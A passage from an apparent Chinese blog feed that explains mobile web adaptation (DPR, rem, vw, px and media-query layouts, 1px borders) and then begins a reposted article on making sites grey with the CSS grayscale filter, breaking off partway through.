<h3 id="设备独立像素"><a href="#设备独立像素" class="headerlink" title="设备独立像素"></a>设备独立像素</h3><p>设备独立像素（DIP）&#x3D;&#x3D;&#x3D; CSS 像素 &#x3D;&#x3D;&#x3D; 逻辑像素，在 Chrome 中能直接看到 375* 667</p>
<p><img src="https://pic1.zhimg.com/80/v2-1897b2ecf3639af35af1c7136d32b769_720w.webp?source=1940ef5c" alt="img"></p>
<p>chrome中查看css像素</p>
<p>当你看到设备独立像素时，不要慌，它表示 CSS 像素，而它的长宽就是在 Chrome 中所查到的。可这样记忆，“设备独立像素”，字数长，文绉绉就是 CSS 像素，也是理论上人为给定的指标，也叫逻辑像素</p>
<h3 id="物理像素"><a href="#物理像素" class="headerlink" title="物理像素"></a>物理像素</h3><p>物理像素可以理解为手机厂商在卖手机时宣传的分辨率，即物理像素 &#x3D; 分辨率，它表示垂直和水平上所具有的像素点数</p>
<p>也就是说设备屏幕的水平方向上有 1920 像素点，垂直方向有 1080 像素点（假设屏幕分辨率为1920*1080），即屏幕分辨率表示物理像素，它在出厂时就定下来，单位为 pt，<code>1pt=0.376mm</code></p>
<p><img src="https://picd.zhimg.com/80/v2-d193bf125c774dd8749286299b62b891_720w.webp?source=1940ef5c" alt="img"></p>
<p>手机分辨率</p>
<p>物理像素，又被称为设备像素，即表示 设备像素 &#x3D;&#x3D;&#x3D; 物理像素。可这样记忆，设备在物理世界能测量的长度</p>
<h3 id="DPR（Device-Pixel-Ratio）"><a href="#DPR（Device-Pixel-Ratio）" class="headerlink" title="DPR（Device Pixel Ratio）"></a>DPR（Device Pixel Ratio）</h3><p>而设备像素比（DPR）是什么？</p>
<p>DPR &#x3D; 设备像素 &#x2F; 设备独立像素，它通常与视网膜屏（Retina 屏）有关</p>
<p>以 iPhone7 为例子，iPhone7 的 DPR &#x3D; iPhone7 物理像素 &#x2F; iPhone7 设备独立像素 &#x3D; 2</p>
<blockquote>
<p>宽 1334 &#x2F; 667 &#x3D; 2<br>高 750 &#x2F; 375 &#x3D; 2</p>
</blockquote>
<p>得到 iPhone7 的 DPR 为 2，也就是我们常说的<a href="https://www.zhihu.com/search?q=%E8%A7%86%E7%BD%91%E8%86%9C%E5%B1%8F%E5%B9%95&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:2439525582%7D">视网膜屏幕</a>，而这就是营销术语，它就是因为技术的进步，使得一个 CSS 像素塞入更多的物理像素</p>
<blockquote>
<p>营销术语还有哪些：农夫山泉的大自然的搬运工、<a href="https://www.zhihu.com/search?q=%E5%85%83%E6%B0%94%E6%A3%AE%E6%9E%97&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:2439525582%7D">元气森林</a>的“気”</p>
</blockquote>
<p>笔者是这么记忆的：</p>
<ul>
<li><p>CSS 像素（设备独立像素）就像一个容器，以前是一比一塞入，所以 DPR 为 1，后来技术发展进步了，一个容器中能塞入更多的真实像素（物理像素）</p>
</li>
<li><p>DPR &#x3D; 设备像素 &#x2F; 设备独立像素</p>
</li>
<li><p>DPR &#x3D; 物理像素（真实）&#x2F; CSS 像素（虚的）</p>
</li>
</ul>
<p>在视网膜屏幕中，以 DPR &#x3D; 2 为例，把 4（2x2）个物理像素当一个 CSS 像素使用，这样让屏幕看起来更加清晰（精致），但是元素的大小（CSS像素）本身不会改变</p>
<p><img src="https://pic1.zhimg.com/80/v2-5c982a7b118386af0b4e04314c541570_720w.webp?source=1940ef5c" alt="img"></p>
<p>DPR对比</p>
<p>随着硬件的发展，像 iPhone13 Pro 等手机的 DPR 已经为 3，未来 DPR 突破 4 不是问题</p>
<p>说回来，DPR 为 2 或 3 会有什么问题？我们以 CSS 为最小单位来写代码的，展示在屏幕上也是以 CSS 为最小单位来展示，也就是说在 DPR 为 2 时，我们想要模拟 <code>1 单位物理像素</code>是做不到的（如果浏览器支持用 <code>0.5px</code> CSS 的话，可以模拟，但是DPR为 3 呢，用 <code>0.333px</code>？）；又因为手机的设备独立像素（CSS 像素）固定，使用传统静态布局（固定 px）时，会出现样式的错位</p>
<blockquote>
<p>iPhone 5&#x2F;SE: 320 <em>568 DPR: 2<br>iPhone 6&#x2F;7&#x2F;8: 375</em> 667 DPR: 2<br>iPhone 6&#x2F;7&#x2F;8 Plus: 414<em>736 DPR: 3<br>iPhone X: 375</em> 812 DPR: 3</p>
</blockquote>
<p>所以我们要适配各终端的 CSS 像素以及不同 DPR 下，出现的 1 像素问题、图片高清问题等。随着技术的发展，前端们摆脱了 IE 的兼容，同时陷入了各大手机品牌的兼容沼泽</p>
<h2 id="自适应方案"><a href="#自适应方案" class="headerlink" title="自适应方案"></a>自适应方案</h2><h3 id="Rem-布局——天下第二"><a href="#Rem-布局——天下第二" class="headerlink" title="Rem 布局——天下第二"></a>Rem 布局——天下第二</h3><p>简介：rem 就是相对于根元素 html 的 font-size 来做计算</p>
<p>与 rem 相关联的是 em：</p>
<blockquote>
<p>em 作为 font-size 单位时，其代表父元素的字体大小，em 作为其它属性单位时，代表自身字体大小<br>rem 作用于非根元素时，相对于根元素字体大小，rem 作用于根元素字体时，相对于其初始字体大小</p>
</blockquote>
<p>本质：<strong>等比缩放</strong>，是通过 JavaScript 来模拟 vw 的特性</p>
<p>假设将屏幕宽度平均分为 100 份，每一份的宽度用 x 表示，x &#x3D; 屏幕宽度 &#x2F; 100，如果将 x 作为单位，x 前面的数值就代表屏幕宽度的百分比</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123; <span class="attribute">width</span>: <span class="number">50</span>x &#125; <span class="comment">/* 屏幕宽度的 50% */</span> </span><br></pre></td></tr></table></figure>

<p>如果想要页面元素随着屏幕宽度等比变化，我们就需要上面的 x，这个 x 就是 vw，但是 vw 是在浏览器支持后才大规模使用，在此之前，js + rem 可模拟这种效果</p>
<p>之前说了，rem 作用于非根元素时，相对于根元素字体大小，所以我们设置根元素单位后，非根元素使用 rem 做相对单位</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">html</span> &#123; <span class="attribute">font-size</span>: <span class="number">16px</span> &#125;</span><br><span class="line"><span class="selector-tag">p</span> &#123; <span class="attribute">width</span>: <span class="number">2rem</span> &#125; <span class="comment">/* 32px */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">html</span> &#123; <span class="attribute">font-size</span>: <span class="number">32px</span> &#125;</span><br><span class="line"><span class="selector-tag">p</span> &#123; <span class="attribute">width</span>: <span class="number">2rem</span> &#125; <span class="comment">/* 64px */</span></span><br></pre></td></tr></table></figure>

<p>问题来了，我们要获取到一个动态的根元素 font-size，并以此变化各个元素大小</p>
<blockquote>
<p>有趣的是，我司两个项目目前的做法是通过媒体查询设置根元素，分为四档，默认16px<br>笔者对这种做法表示不理解，原开发人员说我们这套运行了6年，UI适配也没人说什么问题。这里就有个疑问了，真的如他所说UI适配的很好吗，”媒体查询根元素+rem“也能适配好吗？是否完美呢？<br>后续笔者也会在 demo 中展示这种做法</p>
</blockquote>
<p>但是根元素的 font-size 怎么变化，它不可能一直是 16px，在中大屏下还可以，但是在小屏下字体就太大了，所以它的大小也应该是动态获取的。如何让其动态化，就是上文所说，让根元素的 font-size 大小恒等于屏幕宽度的 1&#x2F;100</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">html</span> &#123; <span class="attribute">font-size</span>: width / <span class="number">100</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>如何设置 html 的字体大小恒等于屏幕宽度的百分之一呢？可以通过 js 来设置，一般需在页面 dom ready、resize 和屏幕旋转中设置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">style</span>.<span class="property">fontSize</span> = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span> / <span class="number">100</span> + <span class="string">&#x27;px&#x27;</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>**<a href="https://github.com/amfe/lib-flexible/blob/2.0/index.js#L18">flexible 源码</a>**就如以上思路写的</p>
</blockquote>
<p>我们设置了百分之一的宽度后，在写 css 时，就需要利用 scss&#x2F;less 等 css 处理器来对 css 编译处理。假设给出的设计图为 750 * 1334，其中一个元素宽度为 200 px，根据公式：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">width: 200 / 750 * 100 = 26.67 rem</span><br></pre></td></tr></table></figure>

<p>在 sass 中，需要设置设计图宽度来做换算：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@use</span> <span class="string">&#x27;sass:math&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$width</span>: <span class="number">750px</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@function</span> px2rem(<span class="variable">$px</span>) &#123;</span><br><span class="line">  <span class="keyword">@return</span> #&#123;math<span class="selector-class">.div</span>($px, $width) * <span class="number">100</span>&#125;rem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面编译完后</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;<span class="attribute">width</span>: <span class="number">26.667rem</span>&#125;</span><br></pre></td></tr></table></figure>

<p>在不同尺寸下，它的宽度不同</p>
<table>
<thead>
<tr>
<th>机型</th>
<th>尺寸</th>
<th>width</th>
</tr>
</thead>
<tbody><tr>
<td>iPhone 5&#x2F;SE</td>
<td>320 * 568</td>
<td>170 *  170</td>
</tr>
<tr>
<td>iPhone 6&#x2F;7&#x2F;8</td>
<td>375 * 667</td>
<td>200 * 200</td>
</tr>
<tr>
<td>iPhone 6&#x2F;7&#x2F;8 Plus</td>
<td>414 * 736</td>
<td>220.797 * 220.797</td>
</tr>
<tr>
<td>iPhone X</td>
<td>375 * 812</td>
<td>200 * 200</td>
</tr>
</tbody></table>
<p>效果如下（特意说明：图中演示的是引入 flexible 库，它的根元素的 font-size 为屏幕的 1&#x2F;10）</p>
<p><img src="https://picd.zhimg.com/50/v2-6b8f21729d04aa5a5933e4dea6bb6fc9_720w.jpg?source=1940ef5c" alt="动图封面"></p>
<p>rem布局</p>
<p><strong><a href="https://demo.azhubaby.com/%E8%87%AA%E9%80%82%E5%BA%94%E6%96%B9%E6%A1%88/flexible/index.html">REM 布局(flexible)demo</a></strong></p>
<p>优点：rem 的兼容性能低到 ios 4.1，android 2.1</p>
<p>缺点：</p>
<ul>
<li><p>等比放大（可以说优点也可以理解为缺点，不同场景下使用）</p>
<ul>
<li>用户选择大屏幕有几个出发点，有些人想要更大的字体，更大的图片，有些人想要更多的内容，并不想要更大的图标</li>
</ul>
</li>
<li><p>字体大小不能使用 rem（一般使用媒体查询控制 font-size 大小）</p>
</li>
<li><p>在 PC 端浏览破相，一般设置一个最大宽度</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> clientWidth = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span>;</span><br><span class="line">clientWidth = clientWidth &lt; <span class="number">780</span> ? clientWidth : <span class="number">780</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">style</span>.<span class="property">fontSize</span> = clientWidth / <span class="number">100</span> + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line"></span><br><span class="line">body &#123;</span><br><span class="line"> <span class="attr">margin</span>: auto;</span><br><span class="line"> <span class="attr">width</span>: 100rem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>如果用户禁止 js 怎么办？</p>
<ul>
<li><p>添加 noscripe 标签提示用户</p>
</li>
<li><p><code>&lt;noscript&gt;开启JavaScript，获得更好的体验&lt;/noscript&gt;</code></p>
</li>
<li><p>给 HTML 添加一个 默认字体大小</p>
</li>
</ul>
</li>
</ul>
<p>相关技术方案：flexible（<code>amfe-flexible</code> 或者 <code>lib-flexible</code>） + <code>postcss-pxtorem</code></p>
<h3 id="Viewport-布局——天不生我VW，适配万古如长夜"><a href="#Viewport-布局——天不生我VW，适配万古如长夜" class="headerlink" title="Viewport 布局——天不生我VW，适配万古如长夜"></a>Viewport 布局——天不生我VW，适配万古如长夜</h3><p>vw 是基于 Viewport 视窗的长度单位，这里的视窗（Viewport） 指的是浏览器可视化的区域，而这个可视区域是 window.innerWidth&#x2F;window.innerHeight 的大小</p>
<p>根据  CSS Values and Units Module Level 4： vw 等于初始包含块（html元素）宽度的1%，也就是</p>
<ul>
<li><code>1vw</code> 等于 <code>window.innerWidth</code> 的数值的 1%</li>
<li><code>1vh</code> 等于 <code>window.innerHeight</code> 的数值的 1%</li>
</ul>
<p>看图理解</p>
<p><img src="https://pic1.zhimg.com/80/v2-2884c18dd0431e7392e589d71d14cffc_720w.webp?source=1940ef5c" alt="img"></p>
<p>屏幕的宽高</p>
<p>在说 rem 布局时，曾经举过 x 的例子，x 就是 vw</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* rem 方案 */</span></span><br><span class="line"><span class="selector-tag">html</span> &#123; <span class="attribute">font-size</span>: width / <span class="number">100</span>&#125;</span><br><span class="line"><span class="selector-tag">div</span> &#123; <span class="attribute">width</span>: <span class="number">26.67rem</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* vw 方案 */</span></span><br><span class="line"><span class="selector-tag">div</span> &#123; <span class="attribute">width</span>: <span class="number">26.67vw</span> &#125;</span><br></pre></td></tr></table></figure>

<p>vw 还可以和 rem 方案结合，这样计算 html 字体大小就不需要 js 了</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">html</span> &#123; <span class="attribute">font-size</span>: <span class="number">1vw</span> &#125;</span><br><span class="line"><span class="selector-tag">div</span> &#123;<span class="attribute">width</span>: <span class="number">26.67rem</span> &#125;</span><br></pre></td></tr></table></figure>

<p>效果如下：</p>
<p><img src="https://picd.zhimg.com/50/v2-fa55caf8c417b1ba789dc96d07079937_720w.jpg?source=1940ef5c" alt="动图封面"></p>
<p>vw适配</p>
<p>vw 适配是 CSS 原生支持，而且目前兼容性大多数手机是支持的，也不需要加载 js ，也不会因为 js引发性能问题</p>
<p>vw 确实看上去很不错，但是也存在一些问题</p>
<ul>
<li>也没能很好的解决 1px 边框在高清屏下的显示问题，需要自行处理</li>
<li>由于 vw 方案是完全的等比缩放，在 PC 端上会破相（和 rem一样）</li>
</ul>
<p>相关技术方案：<code>postcss-px-to-viewport</code></p>
<p><strong><a href="https://demo.azhubaby.com/%E8%87%AA%E9%80%82%E5%BA%94%E6%96%B9%E6%A1%88/vw/index.html">VW 布局demo</a></strong></p>
<h3 id="px适配——一力降十会"><a href="#px适配——一力降十会" class="headerlink" title="px适配——一力降十会"></a>px适配——一力降十会</h3><p>不用 rem&#x2F;vw，用传统的响应式布局也能在移动端布局中使用，需要设计规范</p>
<p>使用<strong>css 变量</strong>适配（篇幅原因暂不详细介绍，可直接看**<a href="https://github.com/johanazhu/demo/blob/master/%E8%87%AA%E9%80%82%E5%BA%94%E6%96%B9%E6%A1%88/px/index.scss#L3">代码</a>**）</p>
<p>使用场景：新闻、内容型的网站，不太适用 rem，因为大屏用户想要看到更多的内容，如网易新闻、知乎、taptap</p>
<p><strong><a href="https://demo.azhubaby.com/%E8%87%AA%E9%80%82%E5%BA%94%E6%96%B9%E6%A1%88/px/index.html">PX + CSS变量 demo</a></strong></p>
<h3 id="媒体查询——可有我一席？"><a href="#媒体查询——可有我一席？" class="headerlink" title="媒体查询——可有我一席？"></a>媒体查询——可有我一席？</h3><p>上文讲到我司原先H5端采用媒体查询的方式来做适配，笔者尝试复刻了下，只能说大差不差，能看出媒体查询想做成这件事，但还是心有余而力不足</p>
<p>采用rem、vw、px等方法能实现非标准尺寸（375 <em>667设计稿）下 header 的高度为 <code>165.59px</code>，而 media 因为大屏，将根font-size 设置为17px，结果 header 的高度成为 <code>159.38px</code>（17</em> 9.375rem）</p>
<p>如下GIF所示：</p>
<p><img src="https://picd.zhimg.com/50/v2-d0a6ed653cfdd615d66a68911d8a6682_720w.jpg?source=1940ef5c" alt="动图封面"></p>
<p>媒体查询布局与其他布局对比</p>
<p>所以说仅用媒体查询还是差强人意</p>
<p><strong><a href="https://demo.azhubaby.com/%E8%87%AA%E9%80%82%E5%BA%94%E6%96%B9%E6%A1%88/media/index.html">媒体查询布局demo</a></strong></p>
<h3 id="各种适配的对比"><a href="#各种适配的对比" class="headerlink" title="各种适配的对比"></a>各种适配的对比</h3><p>vw、rem 适配的本质都是等比例缩放，px 直接写，孰优孰劣看自己</p>
<table>
<thead>
<tr>
<th></th>
<th>REM布局</th>
<th>VW布局</th>
<th>PX + css变量布局</th>
</tr>
</thead>
<tbody><tr>
<td>容器最小宽度</td>
<td>支持</td>
<td>不支持</td>
<td>支持</td>
</tr>
<tr>
<td>容器最大宽度</td>
<td>支持</td>
<td>不支持</td>
<td>支持</td>
</tr>
<tr>
<td>高清设备1px边框</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
</tr>
<tr>
<td>容器固定纵横比</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
</tr>
<tr>
<td>优点</td>
<td>1.老牌方案 2.支持高清设备1px边框时，可按以往方式直接写</td>
<td>1.无需引入js 2. 天然支持，写法规范</td>
<td>同VW</td>
</tr>
<tr>
<td>缺点</td>
<td>1. 需要引入 js 设置 html 的font-size 2. 字体大小不能使用 rem  3. 在 PC 端浏览会破相，一般需设置最大宽度</td>
<td>1.在PC端会破相 2.不支持老旧手机</td>
<td>同VW</td>
</tr>
</tbody></table>
<p>除此之外，还有搭配 vw 和rem 的方案</p>
<ul>
<li>给根元素大小设置随着视窗变化而变化的vw单位，动态变化各元素大小</li>
<li>限制根元素字体大小的最大最小值，配合body加上最大宽度和最小宽度</li>
</ul>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// rem 单位换算：定为 75px 只是方便运算，750px-75px、640-64px、1080px-108px，如此类推</span></span><br><span class="line"><span class="variable">$vm_fontsize</span>: <span class="number">75</span>; <span class="comment">// iPhone 6尺寸的根元素大小基准值</span></span><br><span class="line"><span class="keyword">@function</span> rem(<span class="variable">$px</span>) &#123;</span><br><span class="line">     <span class="keyword">@return</span> (<span class="variable">$px</span> / <span class="variable">$vm_fontsize</span> ) * <span class="number">1rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 根元素大小使用 vw 单位</span></span><br><span class="line"><span class="variable">$vm_design</span>: <span class="number">750</span>;</span><br><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: (<span class="variable">$vm_fontsize</span> / (<span class="variable">$vm_design</span> / <span class="number">2</span>)) * <span class="number">100vw</span>; </span><br><span class="line">    <span class="comment">// 同时，通过Media Queries 限制根元素最大最小值</span></span><br><span class="line">    <span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">320px</span>) &#123;</span><br><span class="line">        <span class="attribute">font-size</span>: <span class="number">64px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">540px</span>) &#123;</span><br><span class="line">        <span class="attribute">font-size</span>: <span class="number">108px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// body 也增加最大最小宽度限制，避免默认100%宽度的 block 元素跟随 body 而过大过小</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">max-width</span>: <span class="number">540px</span>;</span><br><span class="line">    <span class="attribute">min-width</span>: <span class="number">320px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="高清方案"><a href="#高清方案" class="headerlink" title="高清方案"></a><strong>高清方案</strong></h2><h3 id="1像素问题"><a href="#1像素问题" class="headerlink" title="1像素问题"></a>1像素问题</h3><p>1像素指在 Retina 屏显示 <code>1单位物理像素</code></p>
<p>很好理解，CSS 像素（设备独立像素）是我们人为规定的，当 DPR 为 1 时，1像素（指我们写的 CSS 像素） 等于 1物理像素；但当 DPR 为 3 时，1像素就为 3 物理像素</p>
<ul>
<li><p>DPR &#x3D; 1，此时 1 物理像素 等于 1 CSS 像素</p>
</li>
<li><p>DPR &#x3D; 2，此时 1 物理像素等于 0.5 CSS 像素</p>
<ul>
<li>border-width: 1px，这里的 1px 其实是 1 CSS 像素宽度，等于 2 物理像素，设计师其实想要的是 border-width: 0.5px</li>
</ul>
</li>
<li><p>DPR &#x3D; 3，此时 1 物理像素等于 0.33 CSS 像素</p>
<ul>
<li>设计师想要的是 <a href="https://www.zhihu.com/search?q=border-width&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:2439525582%7D">border-width</a>: 0.33px</li>
</ul>
</li>
</ul>
<p><img src="https://pica.zhimg.com/80/v2-0aef93dcb893ea9c3af88f5649e8d0ea_720w.webp?source=1940ef5c" alt="img"></p>
<p>1像素问题</p>
<h3 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h3><p>使用 <code>0.5px</code> 。有局限性，iOS 8及以上，苹果系统支持，但是 iOS 8以下和 Android（部分低端机），会将<code>0.5px</code> 显示为 <code>0px</code></p>
<p>既然 1 个 CSS 像素代表 2（DPR 为2）、3（DPR为3）物理像素，设备又不认识 0.5px 的写法，那就画 1px，然后想办法将宽度减少一半</p>
<h3 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h3><ul>
<li><p>渐变实现</p>
<ul>
<li>background-image: linear-gradient(to top, ,,,)</li>
</ul>
</li>
<li><p>使用缩放实现</p>
<ul>
<li>transform: scaleY(0.333)</li>
</ul>
</li>
<li><p>使用图片实现</p>
<ul>
<li>base64</li>
</ul>
</li>
<li><p>使用 SVG 实现</p>
<ul>
<li>嵌入 background url</li>
</ul>
</li>
<li><p>border-image</p>
<ul>
<li>低端机下支持度不好</li>
</ul>
</li>
</ul>
<p>以上都是通过 CSS 的媒体查询来实现的</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">-webkit-min-device-pixel-ratio</span>: <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">min-device-pixel-ratio</span>: <span class="number">2</span>) &#123;&#125;</span><br><span class="line"><span class="keyword">@media</span> <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">-webkit-min-device-pixel-ratio</span>: <span class="number">3</span>),</span><br><span class="line">    <span class="keyword">only</span> screen <span class="keyword">and</span> (<span class="attribute">min-device-pixel-ratio</span>: <span class="number">3</span>) &#123;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="图片适配和优化"><a href="#图片适配和优化" class="headerlink" title="图片适配和优化"></a>图片适配和优化</h3><p>图像通常占据了网页上下载资源绝大部分，优化图像通常可以最大限度地减少从网站下载的字节数以及提高网站性能</p>
<p>通常可以，有一些通用的优化手段：为不同 DPR 屏幕提供最适合的图片尺寸</p>
<h2 id="各大厂商的适配分析"><a href="#各大厂商的适配分析" class="headerlink" title="各大厂商的适配分析"></a>各大厂商的适配分析</h2><p>看了不少文章，类似如：**<a href="https://www.jianshu.com/p/2d2d1dfd196f">大厂是怎么做移动端适配的</a>**</p>
<p>各大厂，有用rem适配的、也有用vm适配的、也有vm+rem结合适配的，纯用 px 方案的也有</p>
<ul>
<li><p>新闻、社区等可阅读内容较多的场景：px+flex+百分比</p>
<ul>
<li>如携程、知乎、TapTap</li>
</ul>
</li>
<li><p>对视觉组件种类较多，依赖性较强的移动端页面：vw+rem</p>
<ul>
<li>如电商、论坛</li>
</ul>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>rem 方案，引入 <code>amfe-flexible</code> 库</p>
<p>设计：设计出图是 750 * 1334，设计切好图后，上传蓝湖，按照尺寸写 px。</p>
<p>开发：</p>
<ul>
<li><p>使用 rem 方案</p>
<ul>
<li>引入 <code>amfe-flexible</code> 库</li>
<li>安装 <code>px2rem</code> 之类的 px 转 rem 工具</li>
<li>配置 <code>px2rem</code></li>
<li>在项目中写 px ，输出时是 rem</li>
<li>适用任何场景</li>
</ul>
</li>
<li><p>使用 vw 方案</p>
<ul>
<li>安装 <code>px2vw</code> 之类的 px 转 vw 工具</li>
<li>配置 <code>px2vw</code></li>
<li>在项目中写 px，输出时是 vw</li>
<li>适用任何场景</li>
</ul>
</li>
<li><p>使用 px 方案</p>
<ul>
<li>该怎么样就怎么写，不过因为有设计规划，按钮的大中小尺寸固定、icon 的尺寸有标准、TabBar 的高度也是写死的，当一切都有标准后，写页面就方便了</li>
<li>例如<ul>
<li>左边固定 100 * 50，右边 flex 布局</li>
<li>左边固定 100 * 50，右边 <a href="https://www.zhihu.com/search?q=calc&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:2439525582%7D">calc</a>(100% - 100px)（使用 CSS3 中的 calc 计算）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><strong><a href="https://caniuse.com/">caniuse</a></strong> 网站测试CSS属性与浏览器的兼容性问题</p>
<h2 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h2><p>Q：**<a href="https://www.zhihu.com/question/275803537/answer/383675406">为什么 H5 移动端UI库单位大都是用 px？这样不会有适配问题吗？</a>**</p>
<p>其实我们写好 px 后，如果项目采用 rem 写业务，引入 **<a href="https://github.com/songsiqi/px2rem">px2rem</a>**（已经六年没有维护了） 即可转换。</p>
<p>在有赞 vant 库中，它对浏览器适配的介绍是：</p>
<blockquote>
<p>Viewport 布局<br>Vant 默认使用 <code>px</code> 作为样式单位，如果需要使用 <code>viewport</code> 单位（vw、vh、vmin、vmax），推荐使用 postcss-px-to-viewport 进行转换<br>postcss-px-to-viewport 是一款 PostCSS 插件，用于将 px 单位转化为 vw&#x2F;vh 单位<br>Rem 布局<br>如果需要使用 <code>rem</code> 单位进行适配，推荐使用以下两个工具：</p>
</blockquote>
<ul>
<li>postcss-pxtorem 是一款 PostCSS 插件，用于将 px 单位转化为 rem 单位</li>
<li>lib-flexible 用于设置 rem 基准值</li>
</ul>
<p><a href="https://demo.azhubaby.com/">demo 合集</a></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://www.zhihu.com/question/63663871">移动端适配目前最好的解决方案是什么？</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>H5</tag>
      </tags>
  </entry>
  <entry>
    <title>网站都变灰色了，它是怎么实现的？</title>
    <url>/2022/12/03/20221203-%E7%BD%91%E7%AB%99%E9%83%BD%E5%8F%98%E7%81%B0%E8%89%B2%E4%BA%86%EF%BC%8C%E5%AE%83%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0%E7%9A%84%EF%BC%9F/</url>
    <content><![CDATA[<p>估计大家发现了，这些天，各大网站、APP 都变灰了，原因想必大家都知道了。</p>
<p>粉丝群里有人在问，这是如何做到的？</p>
<p><img src="https://cdn.huatree.top/image-20221203210229852.png" alt="image-20221203210229852"></p>
<span id="more"></span>

<div class="note info"><p>文章转载自IT服务圈儿（微信号itcircle1024）</p>
</div>

<p>我本来想写一篇文章来聊聊，没想到之前已经有一位大佬写过了，而且写的还不错，就不费工夫了，分享给大家吧（对原文有一些删减）。</p>
<p>——编程技术宇宙</p>
<h2 id="网站变灰"><a href="#网站变灰" class="headerlink" title="网站变灰"></a>网站变灰</h2><p>大家可以看到很多很多网站包括主页和内容也都已经变成了灰色，比如百度、B 站、CSDN 等等。</p>
<p>CSDN</p>
<p><img src="https://cdn.huatree.top/image-20221203210305026.png" alt="image-20221203210305026"></p>
<p>百度</p>
<p><img src="https://cdn.huatree.top/image-20221203210330238.png" alt="image-20221203210330238"></p>
<p>大家可以看到全站的内容都变成灰色了，包括按钮、图片等等。这时候我们可能会好奇这是怎么做到的呢？</p>
<p>有人会以为所有的内容都统一换了一个 CSS 样式，图片也全换成灰色的了，按钮等样式也统一换成了灰色样式。但你想想这个成本也太高了，而且万一某个控件忘记加灰色样式了岂不是太突兀了。</p>
<p>其实，解决方案很简单，只需要几行代码就能搞定了。</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>我们选择一个网站，比如 B 站吧，打开浏览器开发者工具。</p>
<p>审查一下网页的源代码，我们可以发现在 html 的这个地方多了一个疑似的 class，叫做 gray，gray 中文即灰色。</p>
<p>变灰效果</p>
<p><img src="https://cdn.huatree.top/image-20221203210446638.png" alt="image-20221203210446638"></p>
<p>其 CSS 内容为：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">html</span><span class="selector-class">.gray</span> &#123;</span><br><span class="line">  -webkit-<span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">0.95</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们将其取消，就能发现网站的颜色就能重新还原回来了。</p>
<p>还原效果</p>
<p>果然是这个样式在起作用，而且是全局的效果，因为它是作用在了 html 这个节点之上的。</p>
<p>另外看看 CSDN，它也是用的这个 CSS 样式，其内容为：</p>
